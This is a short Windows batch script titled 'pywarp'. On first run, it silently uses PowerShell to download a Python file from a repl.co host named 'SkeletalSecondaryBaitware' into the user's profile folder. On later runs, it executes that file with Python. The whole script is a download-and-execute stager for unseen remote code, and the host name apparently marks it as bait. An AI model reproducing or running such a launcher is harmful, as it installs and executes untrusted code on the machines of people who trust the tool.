title pywarp
if NOT exist C:\Users\%USERNAME%\pywarp\pywarp.py (
    mkdir C:\Users\%USERNAME%\pywarp
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://SkeletalSecondaryBaitware.beyondall.repl.co/main.py', 'C:\Users\%USERNAME%\pywarp\pywarp.py')"
    cls
) else (
    cls
    python C:\Users\%USERNAME%\pywarp\pywarp.py
)
pause